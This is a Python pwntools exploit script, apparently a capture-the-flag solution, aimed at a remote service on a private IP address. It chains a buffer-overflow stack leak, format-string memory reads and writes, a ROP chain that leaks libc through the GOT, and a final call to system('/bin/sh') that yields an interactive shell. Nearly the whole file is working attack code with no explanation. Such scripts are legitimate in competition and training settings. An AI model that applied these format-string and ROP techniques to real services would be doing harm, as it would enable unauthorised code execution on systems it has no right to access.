from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

#io=process('./pwn')
#io.recvuntil('emulator')

io=remote('172.20.2.8',15865)
libc=ELF('./libc-2.23.so')


def fl(pl):
    io.recvuntil('floor')
    io.send(pl)

for i in range(25):      #buf 0x28     25
    fl(p8(0)*0x18)

#fl(b'a'*0x28+p64(sec))

d=b""
c=b""
def dump(add):
    print(hex(add))
    global d
    global c
    io.recvuntil('y/n')
    io.sendline('n')
    io.send(b'xxxx%8$sbbbbbbbb'+p64(add))
    io.recvuntil('xxxx')
    k=io.recvuntil('bbbbbbbb')[:-8]
    c+=k
    c+=b'\x00'
    k+=b'\x00'
    #print(k)
    with open("./dump",'rb') as f:
        d=f.read()
    with open("./dump",'wb') as f:
        f.write(d+k)
    #print(d)
    
#io.send('%p'*0x280+'c')   #format  0x500
start=0x602153
#start=0x603002
#dump(start)
'''
while(1):
    ptr=start+len(c)
    dump(ptr)
    if(ptr>0x60309D):
        break
'''

puts_plt=0x4005D0
puts_got=0x602018
read_got=0x602038
pop_rdi=0x400F43
main=0x400DE7

#io.recvuntil('y/n')
#io.sendline('n')
#io.send('%p'*0x100)


pl=b'p'*(0x500-8)+b'b'*8
#+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
io.recvuntil('y/n')
io.sendline('n')
io.send(pl)
io.recvuntil('b'*8)
stack=u64(io.recv(6).ljust(8,b'\x00'))-0x38
print(hex(stack))

io.recvuntil('y/n')
io.sendline('n')
io.send(b'xxxx%8$sbbbbbbbb'+p64(stack))
ret=u64((io.recvuntil('bbbbbbbb')[-11:-8]).ljust(8,b'\x00'))
print(hex(ret))

def write(val,add):
    a=val&0xffff
    b=(val>>16)&0xff
    io.recvuntil('y/n')
    io.sendline('n')
    pl=('%'+str(b)+'c'+"%10$hhn"+'%'+str(a-b)+'c'+"%11$hn").ljust(32,'l').encode()+p64(add+2)+p64(add)
    io.send(pl)

write(pop_rdi,stack)
write(read_got,stack+8)
write(puts_plt,stack+0x10)
write(main,stack+0x18)

io.recvuntil('y/n')
io.sendline('y')
puts=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts-libc.sym['read']
sys=libc_base+libc.sym['system']
sh=libc_base+0x018CE17
print(hex(libc_base))


write(pop_rdi,stack+0x18)
write(sh&0xffffff,stack+0x20)
write((sh>>24)&0xffffff,stack+0x23)
write(sys&0xffffff,stack+0x28)
write((sys>>24)&0xffffff,stack+0x2b)

#write(pop_rdi,stack+0x18)
#write(read_got,stack+0x20)
#write(puts_plt,stack+0x28)


io.recvuntil('y/n')
io.sendline('y')






io.interactive()
